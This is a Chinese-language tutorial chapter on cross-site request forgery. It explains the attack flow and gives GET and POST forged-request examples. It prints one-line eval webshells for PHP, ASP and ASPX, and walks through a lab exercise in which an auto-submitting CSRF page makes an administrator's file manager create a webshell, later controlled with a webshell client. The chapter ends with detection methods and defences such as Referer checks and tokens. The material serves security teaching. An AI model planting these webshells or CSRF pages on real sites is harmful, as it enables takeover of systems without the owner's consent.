# Chapter 6.4 - CSRF

[TOC]

## 0x00 原理

> **跨站请求伪造**（Cross-site request forgery），也被称为 **one-click attack** 或者 **session riding**，通常缩写为 **CSRF** 或者 **XSRF**， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟跨网站XSS相比，**XSS** 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。

CSRF 攻击之所以能够成功，是因为攻击者可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 `cookie` 中，因此攻击者可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证，实施操作。

### 0b001 CSRF的攻击流程

1. **用户**：登录被信任**网站A**
2. **网站A**：验证通过，保留用户**Cookie**
3. **用户**：在不关闭**网站A**会话情况下进入预备好的CSRF**网页B**
4. **网页B**：通过Js指定用户携带`传参信息`访问**网站A**
5. **网站A**：验证用户保留**Cookie**，接受用户`传参信息`

> 由此可见，CSRF便是引导浏览器使用用户的Cookie模拟用户传参。

### 0b010 常见的CSRF类型

**GET**类型：通过地址栏的GET传参伪造HTTP请求，如

```
http://ABC.xyz/index.php?id=12
```

实际运用：

```
<img src=http://ABC.xyz/index.php?id=12 />
```

**POST**类型：通常通过表单提交POST请求，如

```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <!-- 指定传参URL及方法 -->
  	<form action="#URL" method="POST">
      <input type="hidden" name="action" value="send" />
      <input type="hidden" name="comtype" value="comments" />
     <!-- 显示按钮提交 -->	
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

### 0b011 一句话木马

```php
#php的一句话木马： 
<?php @eval($_POST['PASS']);?>
#asp
<%eval request ("PASS")%>
#aspx
<%@ Page Language="Jscript"%> <%eval(Request.Item["PASS"],"unsafe");%>
```

利用**文件上传漏洞**，往目标网站中上传一句话木马，然后通过注入软件获取和控制整个网站目录。@表示后面即使执行错误，也不报错。`eval（）`函数表示括号内的语句字符串什么的全都当做代码执行。`$_POST['PASS']`表示服务器将从页面中获得PASS这个参数值。

## 0x01 复现过程

1. 使用指纹识别后安装一个与靶场相同的cms 先在本地测试好了后再实战

	![](https://nc0.cdn.zkaq.cn/md/5371/3072dc6f53be64dbaf9f6f01a08724cd_13009.png)
2. 登录后可见此cms上有文件式管理器 

	![](https://nc0.cdn.zkaq.cn/md/5371/5461e6b56bf77b58e28328b5a26a81b0_26357.png)
3. 新建文件222.php 内容写一句话木马 此时打开burpsuite抓包

	![](https://nc0.cdn.zkaq.cn/md/5371/3196e1bec5caa09d573db51a9673f65f_77947.png)
4. 抓到的数据包里面没有token，极大概率存在csrf漏洞，此时我们使用burp中的Generate CSRF PoC功能，将生成好的html代码复制出来 新建一个HTML文件

	![](https://nc0.cdn.zkaq.cn/md/5371/3eb6e15285fa9517d7746ed027a5d4ae_69326.png)
	![](https://nc0.cdn.zkaq.cn/md/5371/4f400143320907c480227a9aaa631052_38371.png)
5. 让代码实现自动提交功能

	![](https://nc0.cdn.zkaq.cn/md/5371/37d03761dd864a1eed27be3d0abfb986_64386.png)
6. 将csrf.html 拖到浏览器，此时文件式管理器自动生成一个222.php，本地测试成功

	![](https://nc0.cdn.zkaq.cn/md/5371/d151d504faf96df07929b38473fb80bf_83428.png)
7. 实战和本地唯一的区别就是域名此时修改csrf.html里面的域名即可

	![](https://nc0.cdn.zkaq.cn/md/5371/56e75ec1632eb88b44bf7ebb013ee54e_11139.png)
8. 将csrf.html通过反馈界面上传
	![](https://nc0.cdn.zkaq.cn/md/5371/24394eeeae40d82b0d2cc7826dcb78a2_68569.png)

9. 等待管理员访问我们刚才的提交的那个木马文件 访问了后先在链接后面加个phpinfo()探针验证一下 成功后就可以打开菜刀了

	![](https://nc0.cdn.zkaq.cn/md/5371/cd11ea8073cd9591b52387fff571258d_85909.png)
	![](https://nc0.cdn.zkaq.cn/md/5371/1ecf814862f8dfe197394e9f14a4892d_86993.png)
10. 将链接添加进去 后面填入8 点击添加 进入后拿到flag

	![](https://nc0.cdn.zkaq.cn/md/5371/09bc35f363db10dbddebf146cbc7cca4_41913.png)

## 0x02 漏洞检测与防范

### 0b001 漏洞检测

1. 手动方式

   把已有的请求通过从HEADER中去掉Referer后重新提交，如果该提交仍然有效，则大概率存在CSRF漏洞。

2. 自动化工具

   自动化工具会自动抓取页面内所有链接及表单信息，通过用户在工具中修改信息并重新提交来伪造客户端请求，如果修改后的测试请求被服务器接受，则可以认定存在CSRF漏洞。

### 0b010 漏洞防范

1. **服务器验证用户请求中的HTTP Referer字段**

   > 根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站。

   要防御 CSRF 攻击，网站只需要对于每请求验证其 Referer 值，如果是白名单内的域名，则说明该请求是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，服务器自动拒绝该请求。

2. **为用户请求添加token**

   要抵御 CSRF，关键在于在请求中放入黑客所**不能伪造的信息**，并且该信息**不存在于 cookie 之中**。可以在 HTTP 请求中以参数的形式加入一个**随机产生的** `token`，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。

3. **在用户请求的URL或HEADER中加入自定义规则参数**

    这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 `XMLHttpRequest` 这个类，可以一次性给所有该类请求加上 `csrftoken` 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。

## 0x03 思考与要点

1. CSRF与XSS的区别：CSRF伪造请求,XSS为跨站脚本攻击,一个为通过被攻击者浏览器携带验证信息请求头访问网站获取信息,一个则是使用一个脚本攻击。
2. CSRF的成因：Cookie不过期，没有进行进一步的验证用户信息，没有安全意识访问了恶意站点。